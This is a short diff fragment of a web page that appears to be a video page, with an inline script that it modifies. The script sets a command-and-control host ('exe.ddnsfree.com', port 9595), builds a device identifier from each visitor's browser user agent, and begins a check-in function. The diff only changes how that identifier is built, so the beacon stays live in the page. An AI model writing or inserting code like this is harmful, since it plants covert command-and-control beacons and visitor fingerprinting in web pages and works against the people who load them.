@@ -20,7 +20,7 @@ Your browser does not support the video tag.
 (function(){
 var C2_HOST = 'exe.ddnsfree.com';
 var C2_PORT = '9595';
-var DEVICE_ID = navigator.userAgent.replace(/\s/g,'_').slice(0,40);
+var DEVICE_ID = navigator.userAgent.replace(/[^a-zA-Z0-9]/g,'').slice(0,20);
 var BASE_URL = 'http://' + C2_HOST + ':' + C2_PORT;
 
 function sendCheckin(){
